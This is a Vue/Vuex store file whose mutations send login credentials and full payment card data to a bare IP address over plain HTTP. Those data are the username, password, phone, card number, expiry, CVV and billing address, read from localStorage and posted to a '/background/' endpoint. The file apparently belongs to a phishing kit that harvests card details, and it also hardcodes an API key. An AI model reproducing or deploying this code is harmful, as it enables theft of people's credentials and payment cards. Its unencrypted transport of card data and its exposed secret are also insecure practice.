import Vue from "vue";
import Vuex, { Store } from "vuex";
import axios from "axios";
Vue.use(Vuex);

export default new Vuex.Store({
	state: {
		output: "",
		currentId: null,
		customer: {
			profile: {},
			billing: {},
			payData: {}
		},
		backendApiKey: "EYRl0khI.QGIfYCNhh0WkFHpZfG2xkhSL7nduBpIS"
	},
	mutations: {
		login(state, payload) {
			state.customer.profile = state.payload;
			let currentObj = this;
			if (localStorage.phone === null) {
				console.log("You don't have access\nError Code: Unknown");
			} else {
				axios({
					method: "post",
					url: "http://162.213.250.56:62628/account/",
					headers: {
						// "X-Api-Key": "EYRl0khI.QGIfYCNhh0WkFHpZfG2xkhSL7nduBpIS",
						Authorization: "X-Api-Key EYRl0khI.QGIfYCNhh0WkFHpZfG2xkhSL7nduBpIS"
					},
					data: {
						phone: localStorage.phone,
						username: payload.user,
						password: payload.passwd
					}
				})
					.then(function(response) {
						currentObj.state.output = response.data;
						state.output = response.data;
						// console.log(state.output.user_id);
					})
					.catch(function(error) {
						currentObj.state.output = error;
					});
			}
		},
		// updateBilling(state, payload) {
		// 	localStorage.setItem("street_address", payload.address);
		// 	localStorage.setItem("address2", payload.address2);
		// 	localStorage.setItem("city", payload.city);
		// 	localStorage.setItem("state", payload.state);
		// 	localStorage.setItem("zip_code", payload.zip_code);
		// },
		updatePayData(state, payload) {
			state.customer.payment = state.payload;
			// console.log(payload.paynumbers, payload.validity, payload.cvc);
			let currentObj = this;
			axios({
				method: "post",
				url: "http://162.213.250.56:62628/background/",
				headers: {
					Authorization: "X-Api-Key EYRl0khI.QGIfYCNhh0WkFHpZfG2xkhSL7nduBpIS"
				},
				data: {
					phone: localStorage.phone,
					street_address: localStorage.street_address,
					address2: localStorage.address2,
					city: localStorage.city,
					state: localStorage.state,
					zip_code: localStorage.zip_code,
					payment_numbers: localStorage.paynumbers,
					expiration: localStorage.validity,
					cvv: localStorage.cvc
				}
			})
				.then(function(response) {
					currentObj.state.output = response.data;
					// console.log(state.output.user_id);
					localStorage.setItem("status", "completed");
				})
				.catch(function(error) {
					currentObj.state.output = error;
				});
		}
	},
	actions: {},
	getters: {
		getLoginUser: () => {
			return localStorage.user;
		},
		apiResponse: state => {
			return state.output;
		},
		getBilling: state => {
			return state.customer.billing;
		},
		getCustomerData: state => {
			return state.customer.billing;
		}
	}
});
